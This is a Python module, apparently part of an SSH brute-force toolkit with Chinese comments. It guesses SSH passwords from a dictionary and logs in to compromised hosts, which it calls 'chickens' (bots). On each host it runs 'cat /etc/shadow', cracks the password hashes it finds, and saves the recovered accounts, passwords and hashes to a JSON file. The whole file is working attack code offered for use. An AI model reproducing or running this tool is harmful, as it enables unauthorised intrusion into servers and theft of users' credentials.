#!/usr/bin/env python3
# coding=utf-8
__author__ = "riverchu"

import os
import json
import global_var as gv
import threading
import time
from brute import bruteSSH, loginSSH, bruteUnixPasswd


# 破解
def brute(host, user, dictionary, *, connections):
    """调用并进行破解

    :param host:破解目标主机
    :param user:目标用户
    :param dictionary:字典路径
    :param connections:连接数
    :return:
    """
    target = (host, user)
    dic = dict()
    dic['passwd_file'] = dictionary
    dic['max_connection'] = connections

    brute_ret = bruteSSH.brute_ssh(*target, **dic)
    return brute_ret


def crack_chicken_unix_passwd(ip, passwd_file_info):
    if passwd_file_info is None or passwd_file_info == '':
        return None

    # 记录密码文件
    pass_bruteinfo = dict()
    pass_bruteinfo['ip'] = ip
    pass_bruteinfo['account'] = {}
    if passwd_file_info:
        # 破解密码文件内密码
        for line in passwd_file_info.split('\n'):
            if len(line) < 4:
                continue
            passwd_info = bruteUnixPasswd.crack_unix_passwd(line, dic=gv.PASS_DICTIONARY)
            if passwd_info['user'] != 'BannedUser':
                pass_bruteinfo['account'][passwd_info['user']] = {}
                pass_bruteinfo['account'][passwd_info['user']]['password'] = passwd_info['password']
                pass_bruteinfo['account'][passwd_info['user']]['hash'] = line

        # 需要加锁
        if os.path.exists(gv.CHICKEN_PATH + gv.chicken_info_file):
            chicken_info = json.load(open(gv.CHICKEN_PATH + gv.chicken_info_file, 'r'))
        else:
            chicken_info = {}
        chicken_info[ip] = pass_bruteinfo
        json.dump(chicken_info, open(gv.CHICKEN_PATH + gv.chicken_info_file, 'w'), indent=4)


def get_unix_passwdfile(handle):
    cmd_getpass = 'cat /etc/shadow'
    passwd_file_info = loginSSH.send_command(handle, cmd_getpass)
    return passwd_file_info


# handle:pxssh handle host:ip
def standard_operate_chicken(handle, host):
    """肉鸡标准操作

    :param handle:登录句柄
    :param host:目标主机ip地址
    :return:
    """
    if not handle:
        return

    # 破解unix密码
    passwd_file_info = get_unix_passwdfile(handle)
    t = threading.Thread(target=crack_chicken_unix_passwd, args=(host, passwd_file_info))

    loginSSH.close_connection(handle)
    t.join()


# brute_info:{'host': '1.2.3.4', 'user': 'root', 'type': 'password', 'key': None}
def operate_chicken(brute_info):
    """登录肉鸡，并操作

    :param brute_info:登录信息{'host': '1.2.3.4', 'user': 'root', 'type': 'password', 'key': None}
    :return:
    """
    handle = loginSSH.ret_login_handle(brute_info)
    if handle:
        standard_operate_chicken(handle, brute_info['ip'])


# 写入文件
def write_file(filename, passwd_info):
    """存储破解信息

    :param filename:
    :param passwd_info:
    :return:
    """
    with open(filename, 'a') as f:
        f.write(str(passwd_info) + '\n')


# 读取破解结果
def read_files(filename, path=gv.CHICKEN_PATH):
    """读取原破解结果

    :param filename:
    :param path:
    :return:
    """
    if os.path.exists(path):
        chicken_info = json.load(open(gv.CHICKEN_PATH + filename, 'r'))
        return chicken_info


if __name__ == '__main__':
    mess = json.load(open(gv.CHICKEN_PATH + gv.chicken_info_file, 'r'))
    # mess = read_files(CHICKEN_FILE)
    print(json.dumps(mess, indent=4))
